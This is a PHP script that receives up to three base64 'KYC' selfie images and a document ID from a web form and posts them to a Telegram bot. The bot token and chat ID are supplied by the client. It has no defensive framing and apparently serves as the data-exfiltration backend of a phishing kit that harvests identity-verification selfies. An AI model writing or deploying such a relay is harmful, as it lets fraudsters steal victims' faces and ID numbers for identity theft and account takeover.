<?php
// pam.php
error_reporting(E_ALL);
ini_set('display_errors', 1);

function sendPhotoToTelegram($token, $chatId, $dataUrl, $caption) {
    if (!$dataUrl) return false;

    if (preg_match('/^data:image\/(\w+);base64,/', $dataUrl, $type)) {
        $data = substr($dataUrl, strpos($dataUrl, ',') + 1);
        $data = base64_decode($data);
        if ($data === false) return false;
        $ext = strtolower($type[1]); // jpg, png...
    } else {
        return false;
    }

    // Crear archivo temporal
    $tmpFile = tempnam(sys_get_temp_dir(), 'selfie_');
    $tmpPath = $tmpFile . '.' . $ext;
    file_put_contents($tmpPath, $data);

    $url = "https://api.telegram.org/bot{$token}/sendPhoto";

    $postFields = [
        'chat_id' => $chatId,
        'caption' => $caption,
        'photo'   => new CURLFile($tmpPath, "image/{$ext}", 'selfie')
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 30,
    ]);

    $response = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    // borrar archivo temporal
    @unlink($tmpPath);
    @unlink($tmpFile);

    if ($err) {
        error_log(" error: " . $err);
        return false;
    }

    return true;
}

// === Datos recibidos del front ===
$token  = isset($_POST['token'])  ? trim($_POST['token'])  : '';
$chatId = isset($_POST['chat_id'])? trim($_POST['chat_id']): '';
$docId  = isset($_POST['doc_id']) ? trim($_POST['doc_id']) : '';

$photo1 = $_POST['photo1'] ?? null;
$photo2 = $_POST['photo2'] ?? null;
$photo3 = $_POST['photo3'] ?? null;

if ($token === '' || $chatId === '') {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => 'Faltan token o chat_id de Telegram.'
    ]);
    exit;
}

if (!$photo1 && !$photo2 && !$photo3) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => 'No se recibieron fotos.'
    ]);
    exit;
}

$captionBase = $docId !== '' ? "Selfie de documento: {$docId}" : "Selfie KYC";

$ok = false;
if ($photo1) $ok = sendPhotoToTelegram($token, $chatId, $photo1, $captionBase . " (1/3)") || $ok;
if ($photo2) $ok = sendPhotoToTelegram($token, $chatId, $photo2, $captionBase . " (2/3)") || $ok;
if ($photo3) $ok = sendPhotoToTelegram($token, $chatId, $photo3, $captionBase . " (3/3)") || $ok;

if (!$ok) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'No se pudieron enviar las fotos a Telegram.'
    ]);
    exit;
}

echo json_encode([
    'success' => true,
    'message' => 'Fotos enviadas correctamente a Telegram.',
    'doc_id'  => $docId
]);
